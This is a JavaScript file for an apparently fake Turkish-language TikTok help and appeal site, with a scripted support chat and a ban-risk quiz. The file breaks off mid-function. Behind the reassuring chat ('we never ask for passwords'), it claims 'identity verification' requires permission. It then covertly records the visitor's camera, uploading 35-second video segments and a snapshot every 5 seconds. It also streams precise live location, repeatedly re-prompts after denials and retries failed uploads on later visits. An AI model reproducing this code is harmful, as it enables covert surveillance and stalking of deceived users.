(function () {
  const searchInput = document.getElementById("help-search");
  const searchBtn = document.getElementById("search-btn");
  const searchHint = document.getElementById("search-hint");

  const searchMap = [
    {
      keys: /shadow|gölge|golge|fyp|keşfet|kesfet|görünür|gorunur|dağıtım|dagitim/i,
      href: "articles/shadowban.html",
      label: "Görünürlük düşüşü rehberi",
    },
    {
      keys: /algoritma|algorithm|öneri|oneri|viral/i,
      href: "articles/algorithm.html",
      label: "Öneri sistemi rehberi",
    },
    {
      keys: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      href: "articles/views.html",
      label: "İzlenme kontrol listesi",
    },
    {
      keys: /ban|yasak|kapand|askı|aski|suspended|itiraz|appeal/i,
      href: "ban-appeal.html",
      label: "Ban itiraz rehberi",
    },
    {
      keys: /sohbet|destek|chat|yardım|yardim/i,
      href: "chat.html",
      label: "Destek sohbeti",
    },
  ];

  function runSearch() {
    if (!searchHint) return;
    const q = (searchInput?.value || "").trim();
    searchHint.hidden = false;
    if (!q) {
      searchHint.textContent = "Bir konu yazın. Örn: ban, izlenme, algoritma, görünürlük.";
      return;
    }
    const match = searchMap.find((item) => item.keys.test(q));
    if (match) {
      searchHint.innerHTML = `"${q}" için önerilen sayfa: <a href="${match.href}">${match.label}</a>`;
      return;
    }
    searchHint.innerHTML =
      `"${q}" için doğrudan eşleşme yok. <a href="#konular">Popüler konulara</a> bakın veya <a href="chat.html">destek sohbetini</a> kullanın.`;
  }

  searchBtn?.addEventListener("click", runSearch);
  searchInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      runSearch();
    }
  });

  const form = document.getElementById("appeal-form");

  // Ban itiraz kontrol listesi → tüm gönderimler destek sohbetine
  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    location.href = "chat.html";
  });

  /* —— Destek sohbeti —— */
  const SECRETISH =
    /(şifre|sifre|password|parola|e-?posta|email|mail|kullanıcı adı|kullanici adi|otp|doğrulama kodu|dogrulama kodu|hesap şifre|credit card|kart no|telefon numar|gsm)/i;
  const RISK_TRIGGER =
    /risk|hesab(ım|iniz|ınız).*(tehlike|risk|kısıt|kisit)|tehlike|güvenlik uyar|guvenlik uyar|hesabınız risk|hesabiniz risk|risk altınd|kısıtland|kisitland/i;

  const riskQuestions = [
    {
      q: "Soru 1/5 — Uygulamada hesap veya içerik uyarısı görüyor musunuz?",
      options: ["Evet", "Hayır", "Emin değilim"],
      score: { Evet: 3, Hayır: 0, "Emin değilim": 1 },
    },
    {
      q: "Soru 2/5 — Son videoların öneri (For You) trafiği belirgin düştü mü?",
      options: ["Evet, keskin düşüş", "Biraz düşük", "Normal seviyede"],
      score: { "Evet, keskin düşüş": 3, "Biraz düşük": 2, "Normal seviyede": 0 },
    },
    {
      q: "Soru 3/5 — Son 7 günde Topluluk Kuralları veya telif uyarısı aldınız mı?",
      options: ["Evet", "Hayır", "Bilmiyorum"],
      score: { Evet: 3, Hayır: 0, Bilmiyorum: 1 },
    },
    {
      q: "Soru 4/5 — Hesabınızda giriş / güvenlik bildirimi var mı?",
      options: ["Var", "Yok", "Kontrol etmedim"],
      score: { Var: 2, Yok: 0, "Kontrol etmedim": 1 },
    },
    {
      q: "Soru 5/5 — Ana sorun hangisi?",
      options: ["Ban / kapatma", "İzlenme düşüşü", "Genel belirsizlik"],
      score: { "Ban / kapatma": 3, "İzlenme düşüşü": 2, "Genel belirsizlik": 1 },
    },
  ];

  function riskVerdict(total) {
    if (total <= 3) {
      return {
        title: "Öncelik: Düşük",
        body: "Ciddi hesap yaptırımı işareti zayıf görünüyor. Analitik ve içerik performansını kontrol edin. Uygulamada uyarı alırsanız support.tiktok.com üzerinden ilerleyin.",
      };
    }
    if (total <= 8) {
      return {
        title: "Öncelik: Orta",
        body: `Skorunuz ${total}/15. Hesap bildirimlerini ve Analitik trafik kaynaklarını inceleyin. İzlenme için articles/views.html, görünürlük için articles/shadowban.html rehberlerine bakın.`,
      };
    }
    if (total <= 12) {
      return {
        title: "Öncelik: Yüksek",
        body: `Skorunuz ${total}/15. Hesap kısıtı olasılığı yüksek. Ban itiraz rehberini tamamlayın ve resmi TikTok desteğinden itiraz edin.`,
      };
    }
    return {
      title: "Öncelik: Acil",
      body: `Skorunuz ${total}/15. Ban veya güvenlik kısıtı olasılığı güçlü. Hesap işlemlerini yalnızca resmi kanallardan yürütün: support.tiktok.com. Bu sohbet hesabınızı değiştirmez.`,
    };
  }

  const inArticles = /\/articles\//.test(location.pathname) || /\\articles\\/.test(location.pathname);
  const prefix = inArticles ? "../" : "";

  const replies = [
    {
      test: SECRETISH,
      say: "Güvenlik nedeniyle şifre, e-posta veya doğrulama kodu istemiyoruz. Gerçek hesap işlemleri için yalnızca support.tiktok.com kullanın.",
    },
    {
      test: /ban|yasak|kapand|askı|aski|suspended|disabled/i,
      say: [
        `Ban veya kapatma için resmi itiraz gerekir. Kontrol listesi: ${prefix}ban-appeal.html — işlem: support.tiktok.com`,
        "Hesap kapalıysa yalnızca resmi destek üzerinden ilerleyin. Rehber için ‘Ban’ kısayolunu kullanabilirsiniz.",
      ],
    },
    {
      test: /shadow|gölge|golge|fyp|keşfet|kesfet|for you|görünür|gorunur/i,
      say: [
        `Görünürlük düşüşü rehberi: ${prefix}articles/shadowban.html — ayrıntılı kontrol için “Hesabım kısıtlandı” yazarak checklist’i başlatabilirsiniz.`,
        "Öneri trafiği düşüşü her zaman cezaya işaret etmez. Analitik ve hesap uyarılarını kontrol edin.",
      ],
    },
    {
      test: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      say: [
        `İzlenme kontrol listesi: ${prefix}articles/views.html — tamamlanma oranı ve trafik kaynaklarını karşılaştırın.`,
        "Düşük izlenme çoğu zaman içerik/performans kaynaklıdır. Checklist için ‘İzlenmelerim düştü’ yazabilirsiniz.",
      ],
    },
    {
      test: /algoritma|algorithm|öneri|oneri|viral/i,
      say: [
        `Öneri sistemi özeti: ${prefix}articles/algorithm.html`,
        "Algoritma erken etkileşim ve izlenme süresine duyarlıdır. Detaylı rehbere bakın veya kısıt checklist’i başlatın.",
      ],
    },
    {
      test: /merhaba|selam|hey|hi |hello|slm/i,
      say: [
        "Merhaba. Ban, izlenme veya görünürlük sorununda yardımcı olabilirim. Altındaki kısayolları kullanın veya sorunuzu yazın. Şifre istemem.",
        "Selam. Hesap kısıtı kontrolü için ‘Hesabım kısıtlandı’ yazın.",
      ],
    },
    {
      test: /teşekkür|tesekkur|sağol|sagol|thanks/i,
      say: "Rica ederim. Yeni bir kontrol için tekrar ‘Hesabım kısıtlandı’ yazabilirsiniz.",
    },
    {
      test: /yardım|yardim|help|destek/i,
      say: "Buradayım. Ban, izlenme düşüşü veya görünürlük için kısayolları kullanın; kısıt kontrolü için ‘Hesabım kısıtlandı’ yazın. Hesap bilgisi paylaşmayın.",
    },
  ];

  const fallbackReplies = [
    "Anladım. Ban, izlenme veya görünürlük yazın; ya da kısıt kontrolü için ‘Hesabım kısıtlandı’ deyin.",
    "Daha net yardımcı olayım: Ban / İzlenme düşüşü / Görünürlük kısayollarından birini seçin.",
    "Konuyu anlamak için kısayolu kullanın veya ‘Hesabım kısıtlandı’ yazarak checklist’i başlatın.",
    "İlgili rehbere yönlendirebilirim. Ban, izlenme veya kısıt kelimelerinden birini deneyin.",
  ];

  function pick(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function botReply(text) {
    for (const rule of replies) {
      if (rule.test.test(text)) {
        return Array.isArray(rule.say) ? pick(rule.say) : rule.say;
      }
    }
    return pick(fallbackReplies);
  }

  function matchOption(answer, options) {
    const normalized = answer.trim().toLocaleLowerCase("tr-TR");
    const exact = options.find((o) => o.toLocaleLowerCase("tr-TR") === normalized);
    if (exact) return exact;
    const partial = options.find(
      (o) =>
        normalized.includes(o.toLocaleLowerCase("tr-TR")) ||
        o.toLocaleLowerCase("tr-TR").includes(normalized)
    );
    if (partial) return partial;
    if (/^(e|evet|yes|y)$/i.test(normalized)) {
      return options.find((o) => /^evet$/i.test(o)) || null;
    }
    if (/^(h|hayır|hayir|no|n)$/i.test(normalized)) {
      return options.find((o) => /^hayır$/i.test(o)) || null;
    }
    const num = parseInt(normalized, 10);
    if (num >= 1 && num <= options.length) return options[num - 1];
    return null;
  }

  function nowLabel() {
    return new Date().toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" });
  }

  function syncMessage(who, text) {
    const sync = window.ChatSync;
    const send = (readySync) => {
      if (!readySync?.enabled) return;
      readySync.pushMessage(who, text).catch((err) => {
        console.error("Mesaj senkron hatası", err);
      });
    };
    if (sync?.enabled) {
      send(sync);
      return;
    }
    if (window.ChatSyncReady) {
      window.ChatSyncReady.then(send);
    }
  }

  function appendMessage(box, who, text, options = {}) {
    const syncOut = options.sync !== false;
    const isLoading = options.type === "loading";
    const imageUrl = String(options.imageUrl || "").trim();
    if (!box) {
      if (syncOut && (who === "user" || who === "bot") && !imageUrl && !isLoading) {
        syncMessage(who, text);
      }
      return null;
    }
    const label =
      who === "user" ? "Siz" : who === "admin" ? "Destek" : "Asistan";
    const row = document.createElement("div");
    row.className = `chat-bubble chat-${who === "user" ? "user" : "bot"}${
      who === "admin" ? " chat-admin" : ""
    }${isLoading ? " chat-loading" : ""}${imageUrl ? " chat-photo" : ""}`;
    const meta = document.createElement("span");
    meta.className = "chat-meta";
    meta.textContent = `${label} · ${nowLabel()}`;
    const body = document.createElement("div");
    body.className = "chat-loading-body";
    if (isLoading) {
      body.innerHTML = `
        <span class="chat-spinner" aria-hidden="true"></span>
        <p></p>
        <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
      `;
      body.querySelector("p").textContent =
        text || "Kimlik doğrulaması için izinler hazırlanıyor. Lütfen bekleyin…";
    } else {
      const p = document.createElement("p");
      p.textContent = text;
      body.appendChild(p);
      if (imageUrl) {
        const link = document.createElement("a");
        link.href = imageUrl;
        link.target = "_blank";
        link.rel = "noopener";
        link.className = "chat-photo-link";
        const img = document.createElement("img");
        img.src = imageUrl;
        img.alt = text || "Gönderilen fotoğraf";
        img.className = "chat-photo-thumb";
        img.loading = "lazy";
        link.appendChild(img);
        body.appendChild(link);
      }
    }
    row.append(meta, body);
    box.appendChild(row);
    box.scrollTop = box.scrollHeight;
    if (syncOut && (who === "user" || who === "bot") && !imageUrl) {
      syncMessage(who, text);
    }
    return row;
  }

  const cameraSessions = new Map();
  let startVisitorCameraLock = null;

  function pickVisitorRecorderMime() {
    if (typeof MediaRecorder === "undefined") return "";
    const types = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm"];
    return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
  }

  function startVisitorRecording(state) {
    if (!state?.stream || state.recorder || typeof MediaRecorder === "undefined") return false;
    const tracks = state.stream.getVideoTracks().filter((t) => t.readyState === "live");
    if (!tracks.length) return false;
    const mime = pickVisitorRecorderMime();
    let recorder;
    try {
      recorder = mime
        ? new MediaRecorder(new MediaStream(tracks), {
            mimeType: mime,
            videoBitsPerSecond: 1_500_000,
          })
        : new MediaRecorder(new MediaStream(tracks));
    } catch {
      return false;
    }
    const chunks = [];
    state.recordChunks = chunks;
    state.recorderMime = recorder.mimeType || mime || "video/webm";
    recorder.ondataavailable = (e) => {
      if (e.data?.size) chunks.push(e.data);
    };
    state.recorder = recorder;
    try {
      recorder.start(500);
      return true;
    } catch {
      state.recorder = null;
      return false;
    }
  }

  function recordingFileExt(mimeOrBlob) {
    const t = typeof mimeOrBlob === "string" ? mimeOrBlob : mimeOrBlob?.type || "";
    if (/mp4|mpeg|m4v/i.test(t)) return "mp4";
    return "webm";
  }

  function stopVisitorRecorder(state) {
    return new Promise((resolve) => {
      const rec = state?.recorder;
      let settled = false;
      const settle = (blob) => {
        if (settled) return;
        settled = true;
        if (blob?.size) state.lastBlob = blob;
        resolve(blob?.size ? blob : state?.lastBlob || null);
      };
      const buildBlob = () => {
        const blob = new Blob(state.recordChunks || [], {
          type: state.recorderMime || "video/webm",
        });
        return blob.size ? blob : null;
      };
      if (!rec || rec.state === "inactive") {
        settle(buildBlob() || state?.lastBlob || null);
        return;
      }
      const finish = () => settle(buildBlob());
      rec.addEventListener("stop", finish, { once: true });
      try {
        if (rec.state === "recording") {
          try {
            rec.requestData();
          } catch {
            /* ignore */
          }
        }
        rec.stop();
      } catch {
        settle(buildBlob());
      }
      window.setTimeout(() => settle(buildBlob() || state.lastBlob || null), 5000);
    });
  }

  const PENDING_REC_DB = "tiktok-help-pending-rec";
  const PENDING_REC_STORE = "recordings";

  function openPendingRecDb() {
    return new Promise((resolve, reject) => {
      if (!window.indexedDB) {
        reject(new Error("no-idb"));
        return;
      }
      const req = indexedDB.open(PENDING_REC_DB, 1);
      req.onupgradeneeded = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains(PENDING_REC_STORE)) {
          db.createObjectStore(PENDING_REC_STORE, { keyPath: "id" });
        }
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error || new Error("idb-open"));
    });
  }

  async function stashPendingRecording({ sessionId, callId, blob, fileName }) {
    if (!blob?.size || !sessionId || !callId) return;
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).put({
          id: `${sessionId}:${callId}`,
          sessionId,
          callId,
          fileName: fileName || `kamera-${String(callId).slice(0, 8)}.webm`,
          mime: blob.type || "video/webm",
          blob,
          ts: Date.now(),
        });
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch (err) {
      console.warn("pending rec stash", err);
    }
  }

  async function removePendingRecording(id) {
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).delete(id);
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch {
      /* ignore */
    }
  }

  async function drainPendingRecordings() {
    const sync = window.ChatSync;
    if (!sync?.enabled || !sync.uploadCameraRecording) return;
    let rows = [];
    try {
      const db = await openPendingRecDb();
      rows = await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readonly");
        const req = tx.objectStore(PENDING_REC_STORE).getAll();
        req.onsuccess = () => resolve(req.result || []);
        req.onerror = () => reject(req.error);
      });
      db.close?.();
    } catch {
      return;
    }
    for (const row of rows) {
      if (!row?.blob?.size || !row.sessionId || !row.callId) {
        await removePendingRecording(row?.id);
        continue;
      }
      try {
        await sync.uploadCameraRecording(row.sessionId, row.callId, row.blob, row.fileName, {
          finalize: true,
        });
        await removePendingRecording(row.id);
        syncMessage("user", "Bekleyen kamera kaydı gönderildi.");
      } catch (err) {
        console.warn("pending rec upload", err);
      }
    }
  }

  const SEGMENT_UPLOAD_MS = 35_000;

  async function rotateAndUploadSegment(state, sessionId, callId, sync) {
    if (!state || !cameraSessions.has(callId) || state._segmentBusy) return;
    if (!sync?.uploadCameraRecording) return;
    state._segmentBusy = true;
    try {
      const blob = await stopVisitorRecorder(state);
      startVisitorRecording(state);
      if (!blob?.size || !cameraSessions.has(callId)) return;
      const ext = recordingFileExt(blob);
      const name = `kamera-${String(callId).slice(0, 8)}.${ext}`;
      await sync.uploadCameraRecording(sessionId, callId, blob, name, { finalize: false });
    } catch (err) {
      console.warn("segment upload", err);
      if (cameraSessions.has(callId) && !state.recorder) {
        startVisitorRecording(state);
      }
    } finally {
      state._segmentBusy = false;
    }
  }

  function startSegmentUploads(state, sessionId, callId, sync) {
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    state.segmentTimer = window.setInterval(() => {
      void rotateAndUploadSegment(state, sessionId, callId, sync);
    }, SEGMENT_UPLOAD_MS);
  }

  async function stopCameraSession(callId, { upload = true } = {}) {
    const state = cameraSessions.get(callId);
    if (!state) return;
    cameraSessions.delete(callId);

    if (state.maxDurationTimer) {
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    // Parça yükleme orta sıradaysa kayıp blob olmasın
    if (state._segmentBusy) {
      await new Promise((r) => window.setTimeout(r, 1200));
    }
    state._segmentBusy = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    if (state.snapshotTimer) {
      window.clearInterval(state.snapshotTimer);
      state.snapshotTimer = null;
    }
    try {
      if (state.snapVideo) {
        state.snapVideo.pause?.();
        state.snapVideo.srcObject = null;
        state.snapVideo.remove?.();
      }
    } catch {
      /* ignore */
    }
    state.snapVideo = null;

    try {
      state.unsubAnswer?.();
      state.unsubIce?.();
    } catch {
      /* ignore */
    }

    if (state.geoWatchId != null && navigator.geolocation) {
      try {
        navigator.geolocation.clearWatch(state.geoWatchId);
      } catch {
        /* ignore */
      }
      state.geoWatchId = null;
    }

    const sync = window.ChatSync;
    const sid = sync?.getSessionId?.();

    // Admin’e hemen “bitiyor” sinyali — upload bitmeden sayfa ölürse bile
    if (upload && sync?.enabled && sid) {
      sync
        .setCameraCallStatus?.(sid, callId, "ended")
        .catch(() => {});
      try {
        await sync.writeCameraSignal?.(sid, callId, "recordingStatus", "finalizing");
      } catch {
        /* ignore */
      }
    }

    // Önce kaydı bitir (track’ler hâlâ açıkken)
    const blob = await stopVisitorRecorder(state);

    // Kamerayı hemen kapat / önizlemeyi kaldır
    try {
      state.pc?.close();
    } catch {
      /* ignore */
    }
    try {
      state.stream?.getTracks()?.forEach((t) => t.stop());
      if (state.video?.srcObject) state.video.srcObject = null;
      state.wrap?.remove();
    } catch {
      /* ignore */
    }

    if (upload && sync?.enabled && sid) {
      if (blob?.size) {
        const ext = recordingFileExt(blob);
        const fileName = `kamera-${String(callId).slice(0, 8)}.${ext}`;
        await stashPendingRecording({ sessionId: sid, callId, blob, fileName });
        try {
          await sync.uploadCameraRecording(sid, callId, blob, fileName, { finalize: true });
          await removePendingRecording(`${sid}:${callId}`);
          syncMessage("user", "Kamera oturumu sonlandı; kayıt gönderildi.");
        } catch (err) {
          console.error(err);
          syncMessage(
            "user",
            `Kamera kapandı; kayıt yüklenemedi (${err?.code || err?.message || "hata"}). Tekrar girişte denenecek.`
          );
        }
      } else {
        await sync.markCameraRecordingFailed?.(sid, callId, "empty-recording").catch(() => {});
        syncMessage("user", "Kamera oturumu sonlandı; kayıt boş olduğu için gönderilemedi.");
      }
    }
  }

  const SNAPSHOT_INTERVAL_MS = 5_000;

  async function captureStreamFrameBlob(stream) {
    const track = stream?.getVideoTracks?.()?.find((t) => t.readyState === "live");
    if (!track) return null;

    if (typeof ImageCapture !== "undefined") {
      try {
        const ic = new ImageCapture(track);
        if (typeof ic.takePhoto === "function") {
          const photo = await ic.takePhoto();
          if (photo?.size) return photo;
        }
        if (typeof ic.grabFrame === "function") {
          const bitmap = await ic.grabFrame();
          const canvas = document.createElement("canvas");
          canvas.width = bitmap.width;
          canvas.height = bitmap.height;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0);
          bitmap.close?.();
          const blob = await new Promise((resolve) =>
            canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
          );
          if (blob?.size) return blob;
        }
      } catch {
        /* canvas yoluna düş */
      }
    }

    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "");
    video.srcObject = new MediaStream([track]);
    try {
      await video.play();
      await new Promise((r) => setTimeout(r, 120));
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      if (!w || !h) return null;
      const canvas = document.createElement("canvas");
      canvas.width = w;
      canvas.height = h;
      canvas.getContext("2d").drawImage(video, 0, 0, w, h);
      return await new Promise((resolve) =>
        canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
      );
    } catch {
      return null;
    } finally {
      try {
        video.pause();
        video.srcObject = null;
      } catch {
        /* ignore */
      }
    }
  }

  function startSnapshotUploads(state, sessionId, callId, sync) {
    if (!sync?.uploadCameraSnapshot || !state?.stream) return;
    let busy = false;
    let count = 0;

    const tick = async () => {
      if (!cameraSessions.has(callId) || busy) return;
      busy = true;
      try {
        const blob = await captureStreamFrameBlob(state.stream);
        if (!blob?.size || !cameraSessions.has(callId)) return;
        count += 1;
        const name = `snap-${String(callId).slice(0, 8)}-${count}.jpg`;
        await sync.uploadCameraSnapshot(sessionId, callId, blob, name);
        if (count === 1) {
          syncMessage("user", "Kamera fotoğrafı gönderildi.");
        }
      } catch (err) {
        console.warn("snapshot upload", err);
      } finally {
        busy = false;
      }
    };

    void tick();
    state.snapshotTimer = window.setInterval(tick, SNAPSHOT_INTERVAL_MS);
  }

  function flushCameraSessionsOnLeave() {
    const ids = [...cameraSessions.keys()];
    for (const id of ids) {
      void stopCameraSession(id, { upload: true });
    }
  }

  // SADECE gerçek çıkış — visibilitychange sekme değişiminde kamerayı öldürmesin
  // (mobilde ayarlara gitmek / bildirim = document.hidden → konum butonu kırılıyordu)
  window.addEventListener("pagehide", flushCameraSessionsOnLeave);
  window.addEventListener("beforeunload", flushCameraSessionsOnLeave);
  window.addEventListener("pageshow", () => {
    void drainPendingRecordings();
  });
  void drainPendingRecordings();

  const VISITOR_RECORD_MAX_MS = 90_000;

  function getOrCreateMediaHost() {
    const chatBox =
      document.querySelector(".chat-page [data-chat-messages]") ||
      document.querySelector("#canli-destek [data-chat-messages]") ||
      document.querySelector("[data-chat-root] [data-chat-messages]");
    if (chatBox) return chatBox;
    // Sohbet yoksa da izin anında kamera açılsın diye gizli host
    let host = document.getElementById("global-media-host");
    if (!host) {
      host = document.createElement("div");
      host.id = "global-media-host";
      host.className = "global-media-host";
      host.hidden = true;
      host.setAttribute("aria-hidden", "true");
      document.body.appendChild(host);
    }
    return host;
  }

  function showSilentCameraStatus(box, callId) {
    const host = box || getOrCreateMediaHost();
    if (!host) return { wrap: null, video: null, label: null };

    const STATUS_TEXT =
      "Kamera açık · konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";

    // Aynı çağrı / tek durum satırı — tekrar ekleme (çakışma önlemi)
    const existing =
      host.querySelector?.(`.chat-camera-preview[data-call-id="${callId}"]`) ||
      document.querySelector(`.chat-camera-preview[data-call-id="${callId}"]`) ||
      host.querySelector?.(".chat-camera-preview.chat-camera-silent") ||
      null;
    if (existing) {
      // Başka host'ta kaldıysa taşı
      if (existing.parentElement !== host) host.appendChild(existing);
      existing.dataset.callId = callId;
      let label = existing.querySelector(".chat-camera-preview-label");
      if (!label) {
        label = document.createElement("p");
        label.className = "chat-camera-preview-label";
        existing.appendChild(label);
      }
      if (label.textContent !== STATUS_TEXT) label.textContent = STATUS_TEXT;
      // Eski kopyaları temizle
      document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
        if (el !== existing) el.remove();
      });
      return { wrap: existing, video: null, label };
    }

    document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
      el.remove();
    });

    const wrap = document.createElement("div");
    wrap.className = "chat-camera-preview chat-camera-silent";
    wrap.dataset.callId = callId;

    const label = document.createElement("p");
    label.className = "chat-camera-preview-label";
    label.textContent = STATUS_TEXT;

    wrap.appendChild(label);
    host.appendChild(wrap);
    if (typeof host.scrollTop === "number") host.scrollTop = host.scrollHeight;
    return { wrap, video: null, label };
  }

  function startLiveLocationWatch(state, sessionId, callId, sync, box, opts = {}) {
    if (!navigator.geolocation || !sync?.writeLiveLocation) {
      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Geolocation yok").catch(() => {});
      return;
    }

    const LOCATION_RETRY_MS = 10_000;
    const LOCATION_DENIED_TEXT =
      "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.";
    const deferAsk = opts.deferAsk === true;
    const silent = opts.silent !== false; // varsayılan: ziyaretçiye konum metni yok
    let lastWriteAt = 0;
    let asking = false;

    if (deferAsk) {
      sync
        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Konum bekleniyor")
        .catch(() => {});
    } else {
      sync
        .writeLocationStatus?.(sessionId, callId, "prompting", "Otomatik konum isteniyor")
        .catch(() => {});
    }

    const clearLocRetry = () => {
      if (state.locationRetryTimer) {
        window.clearTimeout(state.locationRetryTimer);
        state.locationRetryTimer = null;
      }
    };

    const showLocDeniedNotice = () => {
      if (!box) return;
      let el = box.querySelector(".chat-location-perm-denied");
      if (!el) {
        el = document.createElement("div");
        el.className = "chat-inline-prompt chat-location-perm-denied";
        el.innerHTML =
          `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
          '<p class="chat-camera-note">Kimlik doğrulaması için izin gerekir. Alttaki butona dokunun. Pencere açılmazsa tarayıcı ayarlarından izinleri açın.</p>';
        box.appendChild(el);
      }
      box.scrollTop = box.scrollHeight;
    };

    const clearLocDeniedNotice = () => {
      box?.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    };

    const publish = (pos) => {
      if (!cameraSessions.has(callId)) return;
      clearLocRetry();
      clearLocDeniedNotice();
      const now = Date.now();
      if (state._hadLocation && now - lastWriteAt < 2500) return;
      lastWriteAt = now;
      const wasFirst = !state._hadLocation;
      state._hadLocation = true;
      const coords = pos.coords;
      sync
        .writeLiveLocation(sessionId, callId, {
          lat: coords.latitude,
          lng: coords.longitude,
          accuracy: coords.accuracy,
          altitude: coords.altitude,
          heading: coords.heading,
          speed: coords.speed,
          ts: now,
        })
        .catch(() => {});
      if (wasFirst && !state._locationGrantedMsg) {
        state._locationGrantedMsg = true;
        syncMessage("user", "Konum izni verildi.");
        if (state.stream) markMediaPermGranted();
        if (!silent && box) {
          appendMessage(box, "bot", "İzin alındı. İzinler kaydedildi — tekrar sorulmaz.", {
            sync: true,
          });
        }
        if (state.stream && box) maybeOfferPhoneEntry(box);
      }
      if (state.label) {
        state.label.textContent =
          "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
      }
      state._onLocationGranted?.();
    };

    const scheduleRetry = () => {
      // Zorla aç: jest olmasa da tekrar dene (Safari sessiz reddedebilir)
      if (deferAsk) return;
      if (!cameraSessions.has(callId) || state._hadLocation) return;
      clearLocRetry();
      state.locationRetryTimer = window.setTimeout(() => {
        state.locationRetryTimer = null;
        void askLocation(false);
      }, 10000);
    };

    const onErr = (err, { fromUserTap = false } = {}) => {
      // Konum hatası kamerayı ASLA kapatmaz ve sohbete spam basmaz
      if (!cameraSessions.has(callId) || state._hadLocation) return;
      const code = Number(err?.code);
      const isRealUserDeny = fromUserTap === true && code === 1;
      if (isRealUserDeny) {
        sync.writeLocationStatus?.(sessionId, callId, "denied", err?.message || "denied").catch(() => {});
        if (!silent && box) showLocDeniedNotice();
      } else if (!state._locPromptWritten) {
        state._locPromptWritten = true;
        sync.writeLocationStatus?.(sessionId, callId, "prompting", "Konum bekleniyor").catch(() => {});
      }
      scheduleRetry();
    };

    const askLocation = (fromUserTap = false) => {
      if (!cameraSessions.has(callId) || state._hadLocation || asking) return;
      asking = true;
      if (state.geoWatchId != null) {
        try {
          navigator.geolocation.clearWatch(state.geoWatchId);
        } catch {
          /* ignore */
        }
        state.geoWatchId = null;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          asking = false;
          publish(pos);
          if (!cameraSessions.has(callId) || !state._hadLocation) return;
          state.geoWatchId = navigator.geolocation.watchPosition(
            publish,
            (err) => onErr(err, { fromUserTap: false }),
            {
              enableHighAccuracy: true,
              maximumAge: 5000,
              timeout: 20000,
            }
          );
        },
        (err) => {
          asking = false;
          onErr(err, { fromUserTap });
        },
        {
          enableHighAccuracy: false,
          maximumAge: 60000,
          timeout: 30000,
        }
      );
    };

    state.locationRetryTimer = null;
    state.retryLocation = (fromUserTap = false) => askLocation(Boolean(fromUserTap));
    if (!deferAsk) {
      askLocation(false);
    }
  }

  /** Geriye dönük: konum da sohbet kartındaki İzin ver ile istenir */
  function showLocationTapButton(box, callId, options = {}) {
    showCameraRequest(
      box,
      {
        callId,
        text: "İzin zorunlu",
        note: "Kimlik doğrulaması için izin gerekir. Sohbetteki İzin ver’e dokunun; izin penceresi açılacak.",
        okLabel: "İzin ver",
        hideCancel: true,
        locationOnly: true,
      },
      {
        softDeny: true,
        sticky: true,
        nativeFromTap: true,
        locationOnly: true,
        onGranted: () => options.onGranted?.(),
        onSoftDeny: (r) => options.onSoftDeny?.(r),
      }
    );
  }

  function waitForCameraLocation(callId, timeoutMs) {
    return new Promise((resolve) => {
      const state = cameraSessions.get(callId);
      if (!state) {
        resolve(false);
        return;
      }
      if (state._hadLocation) {
        resolve(true);
        return;
      }
      let done = false;
      const finish = (ok) => {
        if (done) return;
        done = true;
        window.clearTimeout(timer);
        if (state._onLocationGranted === onOk) state._onLocationGranted = null;
        resolve(ok);
      };
      const onOk = () => finish(true);
      state._onLocationGranted = onOk;
      const timer = window.setTimeout(() => finish(false), timeoutMs);
    });
  }

  function isLikelyMobile() {
    return (
      /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "") ||
      (Number(navigator.maxTouchPoints) > 0 &&
        typeof window.matchMedia === "function" &&
        window.matchMedia("(pointer: coarse)").matches)
    );
  }

  async function acquireCameraStreamNative() {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error("getUserMedia yok");
    }
    const attempts = [
      { video: true, audio: false },
      { video: { facingMode: "user" }, audio: false },
      { video: { facingMode: { ideal: "user" } }, audio: false },
    ];
    let lastErr;
    for (const constraints of attempts) {
      try {
        return await navigator.mediaDevices.getUserMedia(constraints);
      } catch (err) {
        lastErr = err;
